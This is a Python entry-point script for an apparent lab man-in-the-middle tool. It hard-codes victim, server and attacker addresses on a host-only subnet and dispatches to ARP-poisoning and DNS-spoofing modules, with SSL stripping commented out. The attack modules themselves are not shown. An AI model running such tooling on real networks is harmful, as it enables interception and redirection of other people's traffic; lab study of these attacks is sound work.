import config
import arp_poison
import dns_spoof
#import ssl_strip
import sys

def main():
    interface = config.get_network_config()


    print("Interface: {}".format(interface))

    
    macVictim = '08:00:27:B7:C4:AF'
    ipVictim = '192.168.56.101'
    macServer = '08:00:27:CC:08:6F'
    ipServer = '192.168.56.102'
    macAttacker = '08:00:27:D0:25:4C'
    ipAttacker = '192.168.56.103'


    print("Target IP (M1): {}".format(ipVictim))
    print("Target MAC (M1): {}\n".format(macVictim))

    print("Gateway(Server) IP (M2): {}".format(ipServer))
    print("Gateway(Server) MAC (M2): {}\n".format(macServer))

    print("Attacker IP (M3): {}".format(ipAttacker))    
    print("Attacker MAC (M3): {}\n".format(macAttacker))
    

    if len(sys.argv) != 2:
        print("Usage: python main.py [arp|dns|ssl]")
        sys.exit(1)

    if sys.argv[1] == "arp":
        arp_poison.arp_poison(ipVictim, macVictim, ipServer, macServer, ipAttacker, macAttacker, interface)
    elif sys.argv[1] == "dns":
        dns_spoof.start_spoof(interface)
    #elif sys.argv[1] == "ssl":
        #ssl_strip.start_strip(interface)
    else:
        print("Unknown command: {}. Use either 'arp', 'dns', or 'ssl'".format(sys.argv[1]))
        sys.exit(1)

if __name__ == "__main__":
    main()
